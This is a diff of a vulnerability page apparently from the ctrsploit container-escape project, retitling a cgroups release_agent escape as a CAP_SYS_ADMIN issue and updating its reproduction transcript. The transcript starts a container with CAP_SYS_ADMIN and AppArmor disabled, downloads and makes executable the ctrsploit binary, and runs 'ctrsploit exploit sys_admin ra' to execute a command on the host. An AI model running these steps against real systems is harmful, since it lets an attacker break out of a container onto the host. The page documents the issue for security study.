@@ -10,9 +10,9 @@ changelog:
 
 ---
 
-# release agent escape 
+# CAP_SYS_ADMIN
 
-[edit](https://github.com/ctrsploit/sploit-spec/edit/main/vul/sys_admin/release_agent/README.md)
+[edit](https://github.com/ctrsploit/sploit-spec/edit/main/vul/sys_admin/README.md)
 
 ## 1. Vulnerability Overview
 
@@ -25,14 +25,10 @@ Insecure configuration
 ## 3. Prerequisites
 
 1. cap_sys_admin
-2. root user in container
-3. cgroups v1
-4. top level cgroups subsystem
-5. allow mount syscall
 
 ## 4. Vulnerability Existence Check
 
-`ctrsploit checksec release_agent`
+`ctrsploit checksec sys_admin`
 
 ## 5. Reproduce
 
@@ -106,12 +102,11 @@ WARNING: No swap limit support
 
 ```
 root@ubuntu:~# docker run -ti --name poc --cap-add CAP_SYS_ADMIN --security-opt apparmor=unconfined ubuntu
-root@e33b98bef3c3:/# wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
-root@e33b98bef3c3:/# chmod +x /usr/bin/ctrsploit
-root@e33b98bef3c3:/# ctrsploit --colorful checksec release_agent
-✔  release_agent	# Container can be escaped when has cap_sys_admin and use cgroups v1
-
-root@0499fb51e84c:/# ctrsploit exploit ra -c "hostname"
+root@8dfc14e5321a:/# wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
+root@8dfc14e5321a:/# chmod +x /usr/bin/ctrsploit
+root@8dfc14e5321a:/# ctrsploit --colorful checksec sys_admin
+✔  cap_sys_admin	# Container can be escaped when has cap_sys_admin
+root@8dfc14e5321a:/# ctrsploit exploit sys_admin ra -c "hostname"
 INFO[0001] 
 ===========start of result==============
 localhost.localdomain
